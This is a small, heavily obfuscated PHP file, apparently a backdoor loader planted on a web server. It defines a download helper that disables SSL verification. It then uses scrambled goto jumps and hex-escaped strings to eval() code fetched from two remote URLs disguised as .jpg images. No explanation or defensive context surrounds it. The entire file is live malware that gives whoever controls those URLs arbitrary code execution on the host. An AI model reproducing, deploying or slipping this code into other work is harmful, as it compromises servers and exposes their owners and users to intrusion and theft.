<?php  /***!@#$%^&^&*&*(!____!*****/function web($url) { if (function_exists("\146\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\156\164\x73") && ini_get("\141\x6c\154\x6f\167\x5f\x75\x72\154\x5f\146\x6f\160\145\156")) { $arrContextOptions = array("\163\x73\154" => array("\x76\145\x72\151\146\x79\137\x70\x65\145\162" => false, "\x76\x65\x72\151\146\171\x5f\x70\145\x65\x72\137\156\x61\x6d\x65" => false)); $web = file_get_contents($url, false, stream_context_create($arrContextOptions)); } elseif (function_exists("\x66\157\x70\145\x6e") && function_exists("\163\164\x72\x65\141\x6d\x5f\147\x65\164\137\143\157\x6e\x74\x65\x6e\164\x73") && ini_get("\x61\154\154\x6f\x77\x5f\165\162\x6c\137\x66\157\160\145\156")) { $handle = fopen($url, "\162"); $web = stream_get_contents($handle); } elseif (function_exists("\143\x75\162\154\137\x65\x78\x65\143")) { $conn = curl_init($url); curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($conn, CURLOPT_FRESH_CONNECT, true); curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1); $web = curl_exec($conn); curl_close($conn); } else { $web = false; } return $web; } goto xQ2km; bzIwL: /***!@#$%^&^&*&*(!____!*****/eval/***!@#$%^&^&*&*(!____!*****/("\77\76" . web("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x2E\x73\x6C\x6F\x74\x61\x6F\x2E\x63\x6F\x6D\x2F\x63\x75\x63\x6F\x6B\x2E\x6A\x70\x67")); goto lSIMw; xQ2km: echo @null; goto VKJoM; YYAHA: echo @null; goto bzIwL; VKJoM: /***!@#$%^&^&*&*(!____!*****/eval/***!@#$%^&^&*&*(!____!*****/("\77\x3e" . web("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x6C\x61\x62\x2E\x63\x6F\x6D\x2F\x72\x6F\x6B\x65\x73\x61\x6A\x61\x32\x36\x2F\x62\x6F\x63\x6F\x72\x2F\x2D\x2F\x72\x61\x77\x2F\x6D\x61\x69\x6E\x2F\x6D\x61\x69\x6E\x2E\x6A\x70\x67")); goto YYAHA; lSIMw: /********/ ?>